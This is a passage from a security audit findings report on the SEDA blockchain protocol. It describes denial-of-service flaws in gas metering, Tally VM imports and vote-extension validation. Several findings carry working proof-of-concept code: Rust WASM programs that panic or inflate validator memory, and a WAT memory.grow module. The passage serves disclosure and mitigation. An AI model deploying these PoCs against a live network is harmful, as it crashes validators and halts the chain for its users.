      return false
    }

    return result
  case RevealDataResult:
    result, err := d.queryContract(ctx, coreContract, CanExecutorRevealQuery{CanExecutorReveal: contractMsg})
    if err != nil {
      return false
    }

    return result
```

A malicious user can abuse this unmetered execution by filling a transaction with _the same_ CommitDataResult or RevealDataResult message.


### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path

1. Attacker sends a Transaction filled with the same CommitDataResult message for a data request that is ready for commitment.
2. Since the attacker's transaction passes `checkFreeGas()` for all its messages, the transaction will be eligible for free gas.

Multiple attackers can repeat this attack to exploit unmetered execution and unnecessarily consume validator resources.

### Impact

This can cause chain delays or chain halts.


### PoC
None


### Mitigation
Consider checking that the transaction does not contain duplicate messages before making it eligible for free gas. Another option is to charge gas up front and provide a refund mechanism instead. 

# Issue H-11: Anyone can crash validators with a Tally VM program that panics the call_result_write import 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/247 

## Found by 
g

### Summary

The Tally VM comes with [imports](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/runtime.rs#L50-L60) that serve as a bridge between the host and the VM. These imports are run in the host environment.
When an import panics, it crashes the host, which causes the validator node to crash. The [`call_result_write`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/tally_vm_imports/mod.rs#L16) import can be used
to trigger an out-of-range index access and panic. Since the tally programs are [executed](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) from the Tally module's `Endblock()`, every
validator will crash when the described program is executed, which leads to a chain halt.

### Root Cause

In the imported [`call_result_write`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/core_vm_imports/call_result.rs#L17-L33) function, the user can pass an arbitrary `result_data_length`. As long as `result_data_length` is a value
greater than the length of `ctx.call_result_value`, the host environment will panic due to out-of-range index access.

```rust
  fn call_result_value(
      env: FunctionEnvMut<'_, VmContext>,
      result_data_ptr: WasmPtr<u8>,
      result_data_length: u32,
  ) -> Result<()> {
      let ctx = env.data();
      let memory = ctx.memory_view(&env);

      let target = result_data_ptr.slice(&memory, result_data_length)?;
      let call_value = ctx.call_result_value.read();

      for index in 0..result_data_length {
          // @audit call_value[index] will panic when index is out of range. The user can easily trigger this.
          target.index(index as u64).write(call_value[index as usize])?;
      }

      Ok(())
  }
```

The length of the default value of `ctx.call_result_value` is 0. 

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path
1. The Attacker (anyone) create a WASM program that exploits the vulnerability in the `call_result_write` import.
2. The Attacker then compiles the WASM program and deploys the binary via [`StoreOracleProgram()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/wasm-storage/keeper/msg_server.go#L34-L96).
3. The Attacker posts a Data Request that will execute their earlier deployed Tally Program.
4. Once the Data Request is for tallying, it will be processed in the Tally module's [`EndBlock()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L22-L41).
5. When [executing](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) the Attacker's Tally Program, it panics and crashes all the validators that run it. This causes a chain halt.


### Impact

All validators that execute the Attacker's Tally program will crash and the SEDA Chain will halt.


### PoC

The following WASM program will crash the host environment for the Tally VM.

```rust
#[link(wasm_import_module = "seda_v1")]
extern "C" {
    pub fn call_result_write(result: *const u8, result_length: u32);
}

fn main() {
    unsafe {
        call_result_write(result.as_ptr(), 1 as u32);
    }
}
```

To compile and run the above program, do the following:

1. Create the following `Cargo.toml`.

```toml
[package]
name = "attack"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "attack"
path = "src/main.rs"
```

2. Run the following CLI commands.
```cli
$ rustup target add wasm32-wasi
$ cargo build --target wasm32-wasi
```

3. Copy the output WASM file into the seda-wasm-vm directory. For example:
```cli
// This assumes we are in the root of the Cargo project we just created
$ cp target/wasm32-wasi/debug/attack.wasm ../seda-wasm-vm
```

4. Add the below test to `libtallyvm/src/lib.rs`:
```rust
#[test]
  fn execute_attack() {
      let wasm_bytes = include_bytes!("../../attack.wasm");
      let mut envs: BTreeMap<String, String> = BTreeMap::new();

      envs.insert("VM_MODE".to_string(), "dr".to_string());
      envs.insert(DEFAULT_GAS_LIMIT_ENV_VAR.to_string(), "300000000000000".to_string());

      let tempdir = std::env::temp_dir();
      let result = _execute_tally_vm(
          &tempdir,
          wasm_bytes.to_vec(),
          vec![],
          envs,
      )
      .unwrap();

      println!("Result: {:?}", result);
  }
```

5. Run the test with `cargo test execute_attack`.

The test will crash with the following logs:
```logs
thread 'test::execute_sleepy' panicked at runtime/core/src/core_vm_imports/call_result.rs:42:56:
index out of bounds: the len is 0 but the index is 0
```

### Mitigation
Consider changing the method of writing to `call_result_value` to something like:

```rust
let mut call_value = ctx.call_result_value.write();
call_value.extend_from_slice(&target);
```

# Issue H-12: `call_result_write` import can be exploited for unmetered execution and memory growth 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/248 

## Found by 
g, tallo

### Summary

Unlike the other core Tally imports, [`call_result_write`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/core_vm_imports/call_result.rs#L17-L33) does not call [`apply_gas_cost`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/metering.rs#L92-L126) to charge the caller gas. Any attacker can exploit this issue to do unmetered execution or memory growth because there is no cost to the attacker. This impacts validators by draining their resources, whether CPU or memory, and can lead to chain delays or Chain Halts, in the worst case.

### Root Cause

In the [`call_result_write`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/core_vm_imports/call_result.rs#L17-L33) import, there is no call to `apply_gas_cost` unlike in the other [imports](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/core_vm_imports/execution_result.rs#L11-L14).

```rust
fn call_result_value(
    env: FunctionEnvMut<'_, VmContext>,
    result_data_ptr: WasmPtr<u8>,
    result_data_length: u32,
) -> Result<()> {
    // @audit apply_gas_cost() must be called at the start to apply metering
    let ctx = env.data();
    let memory = ctx.memory_view(&env);

    let target = result_data_ptr.slice(&memory, result_data_length)?;
    let call_value = ctx.call_result_value.read();

    for index in 0..result_data_length {
        target.index(index as u64).write(call_value[index as usize])?;
    }

    Ok(())
}
```

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path

1. The Attacker creates a WASM program that exploits the unmetered execution of `call_result_write`.
The program can either loop for as long as there is gas available (they only need to pay for the gas for the loop) or
set `result_data_length` to 100GB in length.
2. The Attacker then compiles the WASM program and deploys the binary via [`StoreOracleProgram()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/wasm-storage/keeper/msg_server.go#L34-L96).
3. The Attacker posts a Data Request that will execute their earlier deployed Tally Program.
4. Once the Data Request is for tallying, it will be processed in the Tally module's [`EndBlock()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L22-L41).
5. When [executing](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) the Attacker's Tally Program, it either crashes all the validators that run it due to Out-of-Memory and cause a chain halt, or the unmetered execution delays block building significantly.


### Impact

Unmetered execution or memory growth will drain the resources of Validators, leading to chain delays or chain halts.


### PoC
None


### Mitigation
Consider calling `apply_gas_cost` in the `call_result_write` import to apply metering.

# Issue H-13: WASI imports can be exploited for unmetered execution or unbounded memory growth 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/249 

## Found by 
g

### Summary

All the WASI imports do not call `apply_gas_cost()`, so they do not do any metering. For example, [`fd_write`](https://github.com/wasmerio/wasmer/blob/e3ea3af23dc27cc28e7b140eb10d4d9b989bc14d/lib/wasix/src/syscalls/wasi/fd_write.rs#L11-L64) does not do any metering. Any attacker can exploit this unmetered execution because there is no cost to the attacker. This impacts validators by draining their resources, whether CPU or memory, and can lead to chain delays or Chain Halts, in the worst case.


### Root Cause

WASI objects are [imported](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/vm_imports.rs#L44-L46) as-is direct from the WASI environment.

```rust
pub fn create_wasm_imports(
    store: &mut Store,
    vm_context: &FunctionEnv<VmContext>,
    wasi_env: &WasiFunctionEnv,
    wasm_module: &Module,
    call_data: &VmCallData,
) -> Result<Imports> {
    // @audit the WASI environment's import objects
    let wasi_import_obj = wasi_env.import_object(store, wasm_module)?;
    // ... snip ...

    for allowed_import in allowed_imports.iter() {
        // "env" is all our custom host imports
        if let Some(found_export) = custom_imports.get_export("seda_v1", allowed_import) {
            allowed_host_exports.insert(allowed_import.to_string(), found_export);
        } else if let Some(wasi_version) = wasi_version {
            // When we couldn't find a match in our custom import we try WASI imports
            // WASI has different versions of compatibility so it depends how the WASM was
            // build, that's why we use wasi_verison to determine the correct export
            // @audit the WASI import objects are imported as-is
            if let Some(found_export) = wasi_import_obj.get_export(wasi_version.get_namespace_str(), allowed_import) {
                allowed_wasi_exports.insert(allowed_import.to_string(), found_export);
            }
        }
    }
```

Since the WASI import objects are imported as-is, they do not do any metering. These imported functions must be wrapped in a new
that applies gas metering. 

Below is a list of all the [WASI imports](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/safe_wasi_imports.rs#L3-L21).

```rust
"args_get",
"args_sizes_get",
"proc_exit",
"fd_write",
"environ_get",
"environ_sizes_get",
```

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path
1. The Attacker creates a WASM program that exploits the unmetered execution of any WASI imports.
The program will call a WASI import in a loop for as long as gas is available (they only need to pay for the gas for the loop).
2. The Attacker then compiles the WASM program and deploys the binary via [`StoreOracleProgram()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/wasm-storage/keeper/msg_server.go#L34-L96).
3. The Attacker posts a Data Request that will execute their earlier deployed Tally Program.
4. Once the Data Request is for tallying, it will be processed in the Tally module's [`EndBlock()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L22-L41).
5. When [executing](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) the Attacker's Tally Program, the unmetered execution can delay block building significantly.

This unmetered execution can be compounded by performing the same attack with many data requests, which can cause greater delays in block building.


### Impact
Delay block building, possibly to the point of chain halt.


### PoC
None


### Mitigation
Consider wrapping WASI imports in import objects that call `apply_gas_cost()`. 

# Issue H-14: Anyone can pass any length to some Tally imports to inflate memory, induce OOM, and crash validators 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/250 

## Found by 
g

### Summary

A Tally program can use Tally imports like [`secp256k1_verify`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/core_vm_imports/secp256_k1.rs#L17-L49) and set its `message_length`, `signature_length`, and `public_key_length` to `max::u32` and bloat memory usage by 12GB.

### Root Cause

There are 2 root causes for this issue:

1. There are no limits for `message_length`, `signature_length`, and `public_key_length`.

```rust
fn secp256k1_verify(
    mut env: FunctionEnvMut<'_, VmContext>,
    message: WasmPtr<u8>,
    message_length: i64,
    signature: WasmPtr<u8>,
    signature_length: i32,
    public_key: WasmPtr<u8>,
    public_key_length: i32,
) -> Result<u8> {
    apply_gas_cost(
        crate::metering::ExternalCallType::Secp256k1Verify(message_length as u64),
        &mut env,
    )?;

    let ctx = env.data();
    let memory = ctx.memory_view(&env);

    // Fetch function arguments as Vec<u8>
    // @audit using max::u32 for each of lengths will allocate a total memory of 12GB
    let message = message.slice(&memory, message_length as u32)?.read_to_vec()?;
    let signature = signature.slice(&memory, signature_length as u32)?.read_to_vec()?;
    let public_key = public_key.slice(&memory, public_key_length as u32)?.read_to_vec()?;
```

Below is the calculation for the memory use if maxU32 is used as length for all.

```pseudocode
message_length:     4,294,967,295 bytes
signature_length:   4,294,967,295 bytes
public_key_length:  4,294,967,295 bytes
                   ---------------
Total:            12,884,901,885 bytes

Converting to GB:
12,884,901,885 / 1,073,741,824 ≈ 12 GB
```

2. The [gas cost](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/metering.rs#L115-L117) for calling `secp256k1_verify` with the max lengths is only ~4.3e13 SEDA tokens. One whole SEDA token is 1e18 and
the current price of 1 whole SEDA token ~$0.03019. The cost of bloating all SEDA Chain validators' memory by 12GB is negligible.

Calculation for the `secp256k1_verify` gas cost:

```pseudocode
gas_cost = 1e7 + 1e7 + (1e4 * bytes_length)
bytes_length = maxU32 ~= 4.3e9
gas_cost = 1e7 + 1e7 + (1e4 * ~4.3e9)
gas_cost = ~4.3e13   // The gas cost is much less than 1e18 SEDA tokens
```

* Note that the issue also exists in `keccak256` and `execution_result` but in lesser degrees.

### Internal Pre-conditions
None

### External Pre-conditions
None


### Attack Path
1. The Attacker creates a WASM program that calls the `secp256k1_verify` import with max::u32 values for `message_length`, `signature_length`, and `public_key_length`.
2. The Attacker then compiles the WASM program and deploys the binary via [`StoreOracleProgram()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/wasm-storage/keeper/msg_server.go#L34-L96).
3. The Attacker posts a Data Request that will execute their earlier deployed Tally Program.
4. Once the Data Request is for tallying, it will be processed in the Tally module's [`EndBlock()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L22-L41).
5. When [executing](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) the Attacker's Tally Program, the validator node's memory usage will inflate by ~12GB. This can crash multiple validators due to Out-of-Memory.


### Impact
Crashing multiple validators due to Out-of-Memory can cause chain halts.


### PoC

The example WASM program that exploits the issue in `secp256k1_verify`.

```rust
#[link(wasm_import_module = "seda_v1")]
extern "C" {
    pub fn secp256k1_verify(
        message: *const u8,
        message_length: i64,
        signature: *const u8,
        signature_length: i32,
        public_key: *const u8,
        public_key_length: i32,
    ) -> u8;
}

fn main() {
    let result = vec![1, 2, 3];
    unsafe {
        secp256k1_verify(
            result.as_ptr(), 
            u32::MAX as i64,
            result.as_ptr(),
            -1i32,
            result.as_ptr(), 
            -1i32,
        );
    }
}
```


### Mitigation
Consider limiting all the length parameters in all the Tally imports and/or increase the gas costs.

# Issue H-15: Malicious proposers can prevent batches from being posted to Prover contracts 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/253 

## Found by 
g, stuart\_the\_minion, zxriptor

### Summary

Posting a batch in the Prover contract requires [consensus](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L112-L123) based on the total voting power of the batch signers. However, a malicious proposer can prevent valid vote extensions (batch signatures) from being recorded.

### Root Cause

When calculating the [`powerPercent`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/batching/keeper/endblock.go#L185) of each validator in the Validator Tree, it is based on the [total power](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/batching/keeper/endblock.go#L160) of the last active validator set.

```golang
func (k Keeper) ConstructValidatorTree(ctx sdk.Context) ([]types.ValidatorTreeEntry, []byte, error) {
  // @audit total power is the total power of the last active validator set
	totalPower, err := k.stakingKeeper.GetLastTotalPower(ctx)
  // ... snip ...
  
	err = k.stakingKeeper.IterateLastValidatorPowers(ctx, func(valAddr sdk.ValAddress, power int64) (stop bool) {
    // ... snip ...
		powerPercent := uint32(math.NewInt(power).MulRaw(1e8).Quo(totalPower).Uint64())
```

However, consensus for vote extensions is only based on the total submitted [extended votes](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L250-L256). Extended votes is injected by the proposer and a malicious proposer can set it arbitrarily.

```golang
func (h *Handlers) ProcessProposalHandler() sdk.ProcessProposalHandler {
	return func(ctx sdk.Context, req *abcitypes.RequestProcessProposal) (*abcitypes.ResponseProcessProposal, error) {
		// ... snip ...

		var extendedVotes abcitypes.ExtendedCommitInfo
		if err := json.Unmarshal(req.Txs[0], &extendedVotes); err != nil {
			h.logger.Error("failed to decode injected extended votes tx", "err", err)
			return nil, err
		}

		// Validate vote extensions and batch signatures.
		err = baseapp.ValidateVoteExtensions(ctx, h.stakingKeeper, req.Height, ctx.ChainID(), extendedVotes)
```

The proposed block with the malicious extended votes payload will pass the proposal as long as:
1. There is at least 1 vote, so that [total voting power](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/baseapp/abci_utils.go#L138-L140) is not 0.
2. The has a [BlockIdFlag](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/baseapp/abci_utils.go#L87) of Commit.
3. There are valid vote extensions enough to satisfy the [consensus check](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/baseapp/abci_utils.go#L143-L148). For 1 valid vote, that vote should a valid vote extension.

As long as the conditions above are satisfied, the malicious proposer can submit only 1 valid vote extension so there will
not be enough batch signatures to post a batch.

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path
1. A Malicious proposer injects [`extendedVotes`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L250) with just 1 valid vote extension.
2. Validators will accept the proposal since it will pass the [`ValidateVoteExtensions()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L256) and the [`verifyBatchSignatures()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L264) check .
3. In the `PreBlocker()`, only the 1 vote extension will be recorded as a batch signature for its corresponding batch.
4. The batch can not be posted to the EVM Prover contracts because of the [consensus](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L123-L125) requirement.


### Impact

Malicious proposers can prevent valid batches from being posted.


### PoC
None


### Mitigation
Consider recording and getting the Total Voting Power of the active validator set from the height of the last local commit and use that for the consensus check. 

# Issue H-16: A request poster can set gas_price to 1 and pay minimal fees for a lot of gas and drain validators' resources 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/256 

## Found by 
g

### Summary

Due to a lack of validation on `gas_price`, anyone can post a request to the SEDA Core contract that will consume a lot
of resources of validators.

### Root Cause

In [`post_request():9-102`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain-contracts/contract/src/msgs/data_requests/execute/post_request.rs#L9-L102), no validations are done on the `gas_price` and the amount of funds that are [required](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain-contracts/contract/src/msgs/data_requests/execute/post_request.rs#L32-L33) from the
poster is just the `total gas limit * gas price`.

```rust
let required = (Uint128::from(self.posted_dr.exec_gas_limit) + Uint128::from(self.posted_dr.tally_gas_limit))
    .checked_mul(self.posted_dr.gas_price)?;
```

Since there is no minimum `gas_price`, the request poster can set it to 1.

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path
1. A request poster will submit a valid data request with `gas_price` set to 1, 1 replication factor, tally gas limit set to the max.
2. A malicious validator commit-reveals a result for this data request and its status changes to "tallying".
3. In the Tally module's [`EndBlock()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L22-L41), all "tallying" data requests will be processed. When the malicious data request is processed, it [executes](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L210) the Tally Program with the tally gas limit. 
4. The Tally Program executed can allocate the maximum memory by using imports and loop until the tally gas limit is reached to inflate
memory usage and block execution as long as possible. The inflated memory use lasts as long as the tally program has not exited.


### Impact

Inflated resource use on validators running the Tally `EndBlock()` will cause chain delays or chain halts in the worst case.


### PoC
None


### Mitigation
Consider requiring a minimum `gas_price` per data request.

# Issue H-17: ASA-2025-003: Groups module can halt chain when handling a malicious proposal 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/271 

## Found by 
4n0nx, Boy2000, HarryBarz, x0lohaclohell

### Summary

## cosmos sdk recently publish a bug (https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p) and its mandatory for protocols to update
**As its already has been published by the cosmos group but the protocol didnt update I consider it as a medium not high**

Name: ASA-2025-003: Groups module can halt chain when handling a malicious proposal
Component: CosmosSDK
Criticality: High (Considerable Impact; Likely Likelihood per [ACMv1.2](https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md))
Affected versions: <= v0.47.15, <= 0.50.11
Affected users: Validators, Full nodes, Users on chains that utilize the groups module
Description

An issue was discovered in the groups module where a malicious proposal would result in a division by zero, and subsequently halt a chain due to the resulting error. Any user that can interact with the groups module can introduce this state.
Patches

The new Cosmos SDK release [v0.50.12](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12) and [v0.47.16](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16) fix this issue.
Workarounds

There are no known workarounds for this issue. It is advised that chains apply the update.
Timeline

    February 9, 2025, 5:18pm PST: Issue reported to the Cosmos Bug Bounty program
    February 9, 2025, 8:12am PST: Issue triaged by Amulet on-call, and distributed to Core team
    February 9, 2025, 12:25pm PST: Core team completes validation of issue
    February 18, 2025, 8:00am PST / 17:00 CET: Pre-notification delivered
    February 20, 2025, 8:00am PST / 17:00 CET: Patch made available

This issue was reported to the Cosmos Bug Bounty Program by [dongsam](https://github.com/dongsam) on HackerOne on February 9, 2025. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see https://hackerone.com/cosmos.

If you have questions about Interchain security efforts, please reach out to our official communication channel at [security@interchain.io](mailto:security@interchain.io). For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see https://github.com/interchainio/security.

A Github Security Advisory for this issue is available in the Cosmos SDK [repository](https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p).

### Root Cause

.

### Internal Pre-conditions

.

### External Pre-conditions

.

### Attack Path

.

### Impact

.

### PoC

_No response_

### Mitigation

_No response_

# Issue H-18: Missing Minimum Length Check in verifyBatchSignatures Allows Chain Halting Attack 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/273 

## Found by 
0xHammad, 0xNirix, dod4ufn, g

### Summary

Missing validation of minimum vote extension length will cause a chain-halting panic for all network participants as a malicious validator will submit a vote extension smaller than 65 bytes, triggering a slice out-of-bounds panic during consensus.

### Root Cause


In `verifyBatchSignatures` method at https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L383 , the function checks for maximum length of vote extensions but fails to verify the minimum required length of 65 bytes before attempting to slice the first 65 bytes from the extension:

```go
// Only checks maximum length
if len(voteExtension) > MaxVoteExtensionLength {
    h.logger.Error("invalid vote extension length", "len", len(voteExtension))
    return ErrInvalidVoteExtensionLength
}

// This line will panic if voteExtension has fewer than 65 bytes
sigPubKey, err := crypto.Ecrecover(batchID, voteExtension[:65])
```


### Internal Pre-conditions

NA

### External Pre-conditions

NA

### Attack Path

1. A malicious validator creates an invalid vote extension with fewer than 65 bytes
2. The validator submits this malformed vote extension during the consensus process
3. When `verifyBatchSignatures` is called during either `VerifyVoteExtensionHandler` or `ProcessProposalHandler`, it attempts to access `voteExtension[:65]`
4. This causes a slice out-of-bounds panic because the slice doesn't have 65 elements
5. The panic can halt the entire chain

### Impact

The entire blockchain network suffers a complete service interruption. This is a critical denial-of-service vulnerability that a malicious validator can use to bring down all other validators.


### PoC

_No response_

### Mitigation

_No response_

# Issue H-19: Malicious contracts can force excessive memory usage at minimal gas cost, threatening node stability and economic security 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/298 

## Found by 
stonejiajia, tallo

### Summary

Incorrect implementation of WebAssembly memory growth gas metering will cause a resource exhaustion vulnerability for blockchain node operators as attackers will deploy contracts that allocate large amounts of memory while bypassing appropriate gas costs.

### Root Cause

In `metering.rs`  https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/runtime/core/src/metering.rs#L56

In the gas metering code for WebAssembly operations, specifically in the `get_wasm_operation_gas_cost` function:

```rust
Operator::MemoryGrow { mem, mem_byte: _ } => {
    GAS_MEMORY_GROW_BASE + ((WASM_PAGE_SIZE as u64 * *mem as u64) * GAS_PER_BYTE)
}
```

The implementation incorrectly uses the memory index (`mem`) instead of the actual number of pages being allocated. This is a fundamental misunderstanding of the WebAssembly specification, where:

1. The `mem` parameter refers to the memory index (which memory segment to operate on)
2. The actual number of pages to grow is a runtime value taken from the stack
3. In most WebAssembly modules, `mem` is 0 (since they only have one memory section)

This leads to almost all memory growth operations only being charged the base fee (`GAS_MEMORY_GROW_BASE`), regardless of how many pages are actually allocated.

### Relevant specifications and references:

MDN documentation clearly states that the page count parameter for memory.grow is passed through the stack, as in (memory.grow (i32.const 1)). https://developer.mozilla.org/en-US/docs/WebAssembly/Reference/Memory/Grow

The operational semantics of memory.grow in the WebAssembly Core Specification explicitly depends on the runtime stack top value (see Instructions section in Chapter 6).  https://webassembly.github.io/spec/core/syntax/instructions.html

The JavaScript API design of WebAssembly.Memory.grow() also verifies that the page count is a dynamic parameter
https://developer.mozilla.org/en-US/docs/WebAssembly/Reference/JavaScript_interface/Memory/grow

### Internal Pre-conditions

1. A WebAssembly module needs to include memory growth operations (`memory.grow`)
2. The blockchain system must be using this gas metering implementation
3. The contract must be accepted by the blockchain validators/nodes

### External Pre-conditions

None identified.

### Attack Path

1. Attacker creates a malicious WebAssembly contract that includes `memory.grow` operations requesting large amounts of memory (hundreds or thousands of pages)
2. Attacker deploys this contract to the blockchain
3. When the contract executes, it calls `memory.grow` with a large value
4. The VM charges only `GAS_MEMORY_GROW_BASE` gas (fixed cost) for this operation, regardless of the actual memory pages allocated
5. The contract can now use this large memory allocation for computation without having paid the appropriate gas costs
6. Attacker can repeat this process with multiple contracts, causing excessive memory consumption across blockchain nodes

### Impact

The blockchain nodes suffer excessive resource consumption without corresponding gas payments. This could lead to:

1. Reduced node performance due to memory pressure
2. Potential denial of service for legitimate transactions
3. Breaking of the economic model intended to balance resource usage with gas costs
4. In extreme cases, nodes may crash due to out-of-memory conditions

The economic impact is significant as attackers can execute operations that should cost `GAS_MEMORY_GROW_BASE + (WASM_PAGE_SIZE * actual_pages * GAS_PER_BYTE)` but instead only pay `GAS_MEMORY_GROW_BASE`.

### PoC

```rust
// Simple WebAssembly module (in text format) that exploits this vulnerability:
(module
  (memory 1)
  (func $exploit (result i32)
    ;; Try to grow memory by 1000 pages (65MB)
    i32.const 1000
    memory.grow
  )
  (export "exploit" (func $exploit))
)
```
This module would be charged only GAS_MEMORY_GROW_BASE despite allocating 1000 pages (65MB) of memory.

### Mitigation

The gas metering for memory growth operations should be implemented as a runtime check rather than static analysis. Two approaches are recommended:

1. Modify the metering middleware to inject runtime checks for memory growth:

```rust
// Pseudocode for runtime metering
if operation == memory.grow {
    let pages_to_grow = get_value_from_stack();
    let gas_cost = GAS_MEMORY_GROW_BASE + (WASM_PAGE_SIZE as u64 * pages_to_grow * GAS_PER_BYTE);
    charge_gas(gas_cost);
}
```

2. Implement a host function hook that intercepts memory.grow operations:

```rust
// Host function approach
fn intercept_memory_grow(&mut self, pages: u32) -> Result<i32, Error> {
    let gas_cost = GAS_MEMORY_GROW_BASE + (WASM_PAGE_SIZE as u64 * pages as u64 * GAS_PER_BYTE);
    self.charge_gas(gas_cost)?;
    
    // Proceed with actual memory grow operation
    self.original_memory_grow(pages)
}
```

The fix must be applied immediately as this vulnerability fundamentally breaks the economic security model of the blockchain's resource accounting.

# Issue M-1: Executors will get underpaid while excessive gas will be refunded to the requestor 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/80 

## Found by 
zxriptor

### Summary

Not accounting for outliers in execution gas usage may result in honest executors being underpaid, even if the gas limit is not exhausted, with the remaining amount refunded to the data requestor.

### Root Cause

In [`gas_meter.go:137`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/gas_meter.go#L135-L144) a maximum gas that an executor can receive (`gasUsed`) is capped by the remainingExecGas divided by the replicationFactor:

```golang
func MeterExecutorGasUniform(executors []string, gasReport uint64, outliers []bool, replicationFactor uint16, gasMeter *types.GasMeter) {
	executorGasReport := gasMeter.CorrectExecGasReportWithProxyGas(gasReport)
@>	gasUsed := min(executorGasReport, gasMeter.RemainingExecGas()/uint64(replicationFactor))
	for i, executor := range executors {
		if outliers != nil && outliers[i] {
			continue
		}
		gasMeter.ConsumeExecGasForExecutor(executor, gasUsed)
	}
}
```

At the same time, gas consumption is not recorded for outliers. If the reported gas (`executorGasReport`) exceeds `gasMeter.RemainingExecGas() / uint64(replicationFactor)`, honest executors will be underpaid, even though `gasMeter.RemainingExecGas()` will not be zero after consumption is recorded.

Eventually, this unused residue will be refunded to the data requester instead of being paid to the executors.

### Internal Pre-conditions

1. Remaining exec gas is not enough to cover the expenses of ALL executors.
2. There are outliers among executors.

### External Pre-conditions

None

### Attack Path

Consider the following scenario:

Remaining exec gas: `90,000`
Replication factor: `10`
Gas reported: `10,000` (uniform)
Outliers: `2`

The `gasUsed` will be calculated as `90,000 (remaining gas) / 10 (replication factor)` = `9,000`

Therefore, 8 honest executors will receive `9,000` gas each totaling to `72,000`.
Residue exec gas: `18,000` (will be refunded to data requestor).

Each validator is underpaid by `1,000` gas, even though there is enough remaining gas to fully compensate them and even refund `8,000` gas to the data requester.

### Impact

